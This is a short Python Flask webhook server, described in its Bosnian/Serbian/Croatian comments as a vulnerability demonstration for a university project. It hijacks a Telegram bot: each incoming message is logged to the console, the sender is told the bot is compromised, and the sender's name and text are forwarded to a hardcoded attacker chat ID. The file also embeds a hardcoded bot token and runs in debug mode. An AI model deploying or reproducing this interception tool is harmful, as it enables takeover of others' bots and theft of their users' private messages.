from flask import Flask, request, jsonify
import logging
import json
import requests

app = Flask(__name__)

BOT_TOKEN = "8478231462:AAF5L2G4vHJqHZ2dS04prVoEVUZhPcwJYJg"
YOUR_CHAT_ID = 6462182499   # Tvoj chat_id - ovdje ćeš primati obavještenja

logging.basicConfig(level=logging.INFO)

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        update = request.get_json()
        
        print("\n" + "═"*80)
        print("🔴 BOT KOMPROMITOVAN - NOVA PORUKA PRIMLJENA")
        print("═"*80)
        print(json.dumps(update, indent=2, ensure_ascii=False))
        print("═"*80 + "\n")

        if update and 'message' in update:
            chat_id = update['message']['chat']['id']
            first_name = update['message']['from'].get('first_name', 'Nepoznat')
            user_text = update['message'].get('text', 'Nema teksta')

            # 1. Odgovor korisniku da je bot kompromitovan
            compromised_reply = f"""🚨 **BOT JE KOMPROMITOVAN!**

Pozdrav {first_name},

Tvoja poruka je uspješno primljena i **preusmjerena**.

Ovo je demonstracija ranjivosti za fakultetski projekat."""

            send_message(chat_id, compromised_reply)

            # 2. Pošalji originalnu poruku tebi (na tvoj chat)
            forward_to_me = f"""🔴 **Nova poruka za kompromitovani bot**

👤 Od: {first_name}
💬 Poruka: {user_text}

Full update je u konzoli."""
            
            send_message(YOUR_CHAT_ID, forward_to_me)

        return jsonify({"status": "ok"}), 200

    except Exception as e:
        print(f"Greška: {e}")
        return jsonify({"status": "error"}), 500


def send_message(chat_id, text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": chat_id,
        "text": text,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass


if __name__ == '__main__':
    print("🚀 Webhook server je pokrenut - Bot je spreman za preuzimanje...")
    app.run(port=5000, debug=True)
